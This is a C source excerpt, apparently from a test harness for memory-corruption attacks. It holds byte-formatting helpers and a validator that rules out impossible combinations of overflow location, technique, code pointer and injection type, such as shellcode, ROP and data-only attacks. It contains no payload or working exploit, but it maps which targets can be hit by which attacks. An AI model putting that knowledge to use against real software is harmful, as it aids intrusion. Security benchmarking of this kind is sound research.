// convert a 32-bit hex value to 0-padded, 8-char string
static void
hex_to_string(char * str, size_t val)
{
    snprintf(str, 9, "%08zx", val);
}

// format instruction and append to destination string
static void
format_instruction(uint8_t * dest, size_t insn)
{
    uint8_t insn_bytes[4];

    insn_bytes[0] = (insn >> 24) & 0xff;
    insn_bytes[1] = (insn >> 16) & 0xff;
    insn_bytes[2] = (insn >> 8) & 0xff;
    insn_bytes[3] = insn & 0xff;

    for (int i = 3; i >= 0; i--) {
        dest[3 - i] = insn_bytes[i];
    }
}

bool
is_attack_possible()
{
    if ((g.attack.inject_param == INJECTED_CODE_NO_NOP) &&
      (!(g.attack.function == MEMCPY) && !(g.attack.function == HOMEBREW)))
    {
        print_reason("Error: Impossible to inject shellcode with string functions (for now)\n");
        return false;
    }

    if (g.attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
      g.attack.technique != DIRECT)
    {
        print_reason("Error: Impossible (theoretically) to perform indirect ROP attacks\n");
        return false;
    }

    if (g.attack.inject_param == DATA_ONLY) {
        if (g.attack.code_ptr != VAR_BOF &&
            g.attack.code_ptr != VAR_IOF &&
            g.attack.code_ptr != VAR_LEAK)
        {
            print_reason("Error: Misused DOP code pointer parameters.\n");
            return false;
        }

        if ((g.attack.code_ptr == VAR_LEAK || g.attack.code_ptr == VAR_IOF) && g.attack.technique == INDIRECT) {
            print_reason("Error: Impossible to do an indirect int overflow attack.\n");
            return false;
        }

        if (g.attack.location == HEAP && g.attack.technique == INDIRECT) {
            print_reason("Error: Impossible to indirect attack the heap flag.\n");
            return false;
        }
    } else if (g.attack.code_ptr == VAR_BOF ||
               g.attack.code_ptr == VAR_IOF ||
               g.attack.code_ptr == VAR_LEAK) {
        print_reason("Error: Must use \"dataonly\" injection parameter for DOP attacks.\n");
        return false;
    }

    // attacks targeting another memory location must be indirect
    switch (g.attack.location) {
        case STACK:
            if (g.attack.technique == DIRECT) {
                if ((g.attack.code_ptr == FUNC_PTR_HEAP) ||
                  (g.attack.code_ptr == FUNC_PTR_BSS) ||
                  (g.attack.code_ptr == FUNC_PTR_DATA) ||
                  (g.attack.code_ptr == LONGJMP_BUF_HEAP) ||
                  (g.attack.code_ptr == LONGJMP_BUF_DATA) ||
                  (g.attack.code_ptr == LONGJMP_BUF_BSS) ||
                  (g.attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
                  (g.attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
                  (g.attack.code_ptr == STRUCT_FUNC_PTR_BSS) )
                {
                    print_reason("Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
                    return false;
                } else if ((g.attack.code_ptr == FUNC_PTR_STACK_PARAM) &&
                  ((g.attack.function == STRCAT) ||
                  (g.attack.function == SNPRINTF) ||
                  (g.attack.function == SSCANF) ||
                  (g.attack.function == HOMEBREW)))
                {
                    print_reason("Error: Impossible to attack the stack parameter directly with the following functions: strcat(), snprintf(), sscanf(), homebrew_memcpy()\n");
                    return false;
                }
            }
            break;

        case HEAP:
            if ((g.attack.technique == DIRECT) &&
              ((g.attack.code_ptr == RET_ADDR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (g.attack.code_ptr == FUNC_PTR_BSS) ||
              (g.attack.code_ptr == FUNC_PTR_DATA) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (g.attack.code_ptr == LONGJMP_BUF_BSS) ||
              (g.attack.code_ptr == LONGJMP_BUF_DATA) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_BSS) ))
            {
                print_reason("Error: Impossible to perform a direct attack on the heap into another memory segment.\n");
                return false;
            }
            break;

        case DATA:
            if ((g.attack.technique == DIRECT) &&
              ((g.attack.code_ptr == RET_ADDR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (g.attack.code_ptr == FUNC_PTR_BSS) ||
              (g.attack.code_ptr == FUNC_PTR_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (g.attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_BSS) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_BSS) ))
            {
                print_reason("Error: Impossible to perform a direct attack on the data segment into another memory segment.\n");
                return false;
            }
            break;

        case BSS:
            if ((g.attack.technique == DIRECT) &&
              ((g.attack.code_ptr == RET_ADDR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_VAR) ||
              (g.attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
              (g.attack.code_ptr == FUNC_PTR_DATA) ||
              (g.attack.code_ptr == FUNC_PTR_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
              (g.attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
              (g.attack.code_ptr == LONGJMP_BUF_HEAP) ||
              (g.attack.code_ptr == LONGJMP_BUF_DATA) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
              (g.attack.code_ptr == STRUCT_FUNC_PTR_DATA) ))
            {
                print_reason("Error: Impossible to perform a direct attack on the bss into another memory segment.\n");
                return false;
            } else if ((g.attack.technique == INDIRECT) &&
              (g.attack.code_ptr == LONGJMP_BUF_HEAP) &&
              (!(g.attack.function == MEMCPY) &&
              !(g.attack.function == STRNCPY) &&
              !(g.attack.function == HOMEBREW)))
            {
                print_reason("Error: Impossible to perform BSS->Heap Longjmp attacks using string functions.\n");
                return false;
            }
            break;
    }

    return true;
} /* is_attack_possible */
